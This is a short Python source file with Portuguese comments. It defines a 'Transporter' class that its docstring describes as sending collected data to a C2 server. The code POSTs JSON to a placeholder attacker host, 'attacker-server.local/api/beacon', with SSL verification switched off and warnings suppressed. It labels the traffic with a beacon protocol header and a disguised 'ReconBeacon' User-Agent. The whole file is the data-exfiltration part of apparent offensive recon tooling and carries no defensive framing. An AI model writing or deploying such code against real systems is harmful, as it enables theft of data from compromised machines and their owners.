import json
import requests
import urllib3

# Suprimir warnings de segurança de SSL para conexões internas
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Transporter:
    """
    Envia os dados coletados para o servidor C2.
    """
    def __init__(self, c2_url="http://attacker-server.local/api/beacon", timeout=10):
        self.c2_url = c2_url
        self.timeout = timeout

    def send(self, data: dict):
        """
        Envia o payload JSON para o C2.
        Retorna True se sucesso, False caso contrário.
        """
        try:
            headers = {
                "Content-Type": "application/json",
                "X-Beacon-Protocol": "DeepHat-1.0",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) ReconBeacon/1.0"
            }
            
            # Serializa para JSON
            payload = json.dumps(data, default=str)
            
            response = requests.post(
                self.c2_url, 
                data=payload, 
                headers=headers, 
                timeout=self.timeout,
                verify=False
            )
            
            if response.status_code == 200:
                print(f"[TRANSPORT] Payload sent successfully. Status: {response.status_code}")
                return True
            else:
                print(f"[TRANSPORT] Failed to send. Status: {response.status_code}")
                return False

        except requests.exceptions.RequestException as e:
            print(f"[TRANSPORT] Network error: {e}")
            return False
        except Exception as e:
            print(f"[TRANSPORT] Unexpected error: {e}")
            return False